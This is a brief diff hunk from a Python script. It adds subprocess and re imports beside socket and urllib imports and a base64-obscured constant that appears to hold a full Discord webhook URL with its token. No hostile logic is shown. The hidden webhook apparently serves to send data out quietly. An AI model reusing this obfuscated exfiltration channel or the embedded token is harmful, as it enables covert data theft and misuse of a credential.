@@ -6,6 +6,9 @@ import socket
 import urllib.request
 from time import sleep
 
+import subprocess
+import re
+
 # Base64-encoded Discord webhook URL
 WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2NDY5MTMzMTgyMDU1NjM5Mi9zeS16UkEzS3NYMFp0U1FMSmowZXVvNlVxR3prbF9OSlRBcGhqZm9BR0E0ck1WN2w4eWNERTFuUG9IU2dsSTQ0am1ESQ=="
 
